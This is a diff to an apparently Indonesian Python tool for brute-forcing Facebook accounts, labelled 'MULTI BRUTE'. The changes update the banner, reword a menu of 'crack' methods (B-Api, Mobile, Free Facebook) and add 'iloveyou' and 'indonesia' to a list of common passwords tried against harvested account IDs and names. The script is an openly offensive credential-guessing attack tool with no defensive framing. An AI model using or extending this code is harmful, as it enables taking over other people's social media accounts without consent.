@@ -80,7 +80,7 @@ def banner():
        ____ _ _  _ _ _____    _______  ______  ______  -  _____
       |___  | |__| | |   |  °    |     |     | |     | | |____
    _______| | |  | | |   |  °    |     |_____| |_____| |____  |
-                               _______________________________|
+   ______________________ MULTI BRUTE ________________________|
        ____         ____       [®]PEMBUAT = M ZAINUL UMAM
       |___           ___|      [®]UPDATE  = V1.3
   ________| S H I N |_________ [®]PREMIUM = AKTIF""")
@@ -468,7 +468,7 @@ def setting():
 		exit()
 	met = '# PILIH METHOD CRACK'
 	sol().print(mark(met, style='green'))
-	ioz = '[01] Method B-Api (Cepat)\n[02] Method Mobile (Lambat Hasil OK)\n[03] Methode Free Facebook (Sangat Lambat'
+	ioz = '[01] Method B-Api (Cepat)\n[02] Method Mobile (Hasil OK)\n[03] Methode Free Facebook (Lambat)'
 	gess = nel(ioz, style='cyan')
 	cetak(nel(gess, title='METHOD'))
 	hc = input(x+'['+p+'f'+x+'] Pilih : ')
@@ -501,7 +501,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
+			pwv = ['iloveyou','indonesia','sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
